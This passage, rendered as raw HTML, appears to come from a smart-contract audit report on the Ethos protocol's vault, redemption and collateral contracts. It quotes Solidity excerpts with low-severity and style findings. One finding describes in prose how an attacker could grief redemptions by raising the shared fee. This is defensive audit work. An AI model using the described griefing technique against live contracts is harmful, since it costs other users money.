class=\"mtk11\">_chargeFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gain</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">gain</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">].</span><span class=\"mtk12\">feeBPS</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\"> : (</span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>-> On Active Pool <code>_rebalance</code><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L291-L294\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L291-L294</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldSplitTreasury</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasuryAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span></code></pre>\n<p>Disclose this to end users, or consider reducing the split / adding a caller incentive for the keeper to pay for harvests</p>\n<h3 id=\"113-nc---_addliquidityvelo-is-unused\" style=\"position:relative;\"><a href=\"#113-nc---_addliquidityvelo-is-unused\" aria-label=\"113 nc   _addliquidityvelo is unused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.13. NC - <code>_addLiquidityVelo</code> is unused</h3>\n<p>Delete or comment as to why there’s an unused function</p>\n<p>Strategy</p>\n<h3 id=\"114-nc---steps-not-validated\" style=\"position:relative;\"><a href=\"#114-nc---steps-not-validated\" aria-label=\"114 nc   steps not validated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.14. NC - Steps not validated</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L160-L171\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L160-L171</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setHarvestSteps</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">][] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newSteps</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADMIN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">steps</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numSteps</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newSteps</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numSteps</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\">.</span><span class=\"mtk11\">uncheckedInc</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">step</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newSteps</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">step</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">step</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">steps</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">step</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The steps would allow to sell the want for some other token, which can result in loss of assets as well as loss of yield</p>\n<p>A simple check would be to ensure that <code>step[0]</code> is never the <code>want</code></p>\n<h3 id=\"115-r---equivalent-to-atokenbalanceofthis\" style=\"position:relative;\"><a href=\"#115-r---equivalent-to-atokenbalanceofthis\" aria-label=\"115 r   equivalent to atokenbalanceofthis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.15. R - Equivalent to aToken.balanceOf(this)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L229-L236\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L229-L236</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOfPool</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">, , , , , , , , ) = </span><span class=\"mtk11\">IAaveProtocolDataProvider</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DATA_PROVIDER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getUserReserveData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The main advantage to sticking to aToken is that you’ll keep tracking the old implementation in case of changes</p>\n<h3 id=\"116-r---amount-non-zero-is-known\" style=\"position:relative;\"><a href=\"#116-r---amount-non-zero-is-known\" aria-label=\"116 r   amount non zero is known permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1.16. R - Amount non-zero is known</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L121-L124\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L121-L124</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_swapVelo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">step</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">step</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">VELO_ROUTER</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Can be removed from within <code>_swapVelo</code></p>\n<h2 id=\"2-redemption-helper\" style=\"position:relative;\"><a href=\"#2-redemption-helper\" aria-label=\"2 redemption helper permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. Redemption Helper</h2>\n<h3 id=\"21-l---griefing-redemptions-for-a-specific-collateral-by-redeeming-the-other-one\" style=\"position:relative;\"><a href=\"#21-l---griefing-redemptions-for-a-specific-collateral-by-redeeming-the-other-one\" aria-label=\"21 l   griefing redemptions for a specific collateral by redeeming the other one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2.1. L - Griefing redemptions for a specific collateral by redeeming the other one</h3>\n<p><strong>2.1.1. Impact</strong></p>\n<p>An attacker can grief redemptions for a collateral by redeeming some other collateral, as long as they are willing to pay the fee</p>\n<p><strong>2.1.2. POC</strong></p>\n<p>Because the fee is the same for all collateral, redeeming on collateral will raise the redemption fee for others, this can be used maliciously to grief others</p>\n<p>Because of this, it may be easier to end up getting below MCR, meaning that if the price of the collateral keeps dropping redemptions will be impossible.</p>\n<p>Because of this:</p>\n<ul>\n<li>The protocol will receive less than them sum of X partial redemptions</li>\n<li>This can be used to grief the last redeemer</li>\n</ul>\n<p><strong>2.1.3. Mitigation Steps</strong></p>\n<p>It may be best to have different fees per collateral</p>\n<p>Alternatively, the redemption math could be changed to have the caller pay an increasing fee that scales with the amount being redeemed, instead of having the fee grow for the next caller</p>\n<h3 id=\"22-r---could-revert-earlier-if-found-is-address0\" style=\"position:relative;\"><a href=\"#22-r---could-revert-earlier-if-found-is-address0\" aria-label=\"22 r   could revert earlier if found is address0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2.2. R - Could revert earlier if found is address(0)</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/RedemptionHelper.sol#L153\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/RedemptionHelper.sol#L153</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">totals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentBorrower</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<h2 id=\"3-defaultpool\" style=\"position:relative;\"><a href=\"#3-defaultpool\" aria-label=\"3 defaultpool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3. DefaultPool</h2>\n<h3 id=\"31-nc---cannot-be-front-run\" style=\"position:relative;\"><a href=\"#31-nc---cannot-be-front-run\" aria-label=\"31 nc   cannot be front run permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3.1. NC - cannot be front-run</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/DefaultPool.sol#L90-L91\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/DefaultPool.sol#L90-L91</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">activePool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Increasing allowance is not different in this case</p>\n<p>It could potentially not work with some collateral also, as you’d need to set approve(0) first</p>\n<h2 id=\"4-collateralconfig\" style=\"position:relative;\"><a href=\"#4-collateralconfig\" aria-label=\"4 collateralconfig permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4. CollateralConfig</h2>\n<h3 id=\"41-l---no-check-for-collateral-existence\" style=\"position:relative;\"><a href=\"#41-l---no-check-for-collateral-existence\" aria-label=\"41 l   no check for collateral existence permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4.1. L - No check for collateral existence</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L90-L91\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L90-L91</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Config</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">config</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p>Checking for collateral existence is equivalent to an address(0) check, and can avoid mistakes</p>\n<h3 id=\"42-nc---150-ccr-can-be-either-too-low-or-too-high\" style=\"position:relative;\"><a href=\"#42-nc---150-ccr-can-be-either-too-low-or-too-high\" aria-label=\"42 nc   150 ccr can be either too low or too high permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4.2. NC - 150% CCR can be either too low or too high</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L25-L26\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/CollateralConfig.sol#L25-L26</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"62\"><code 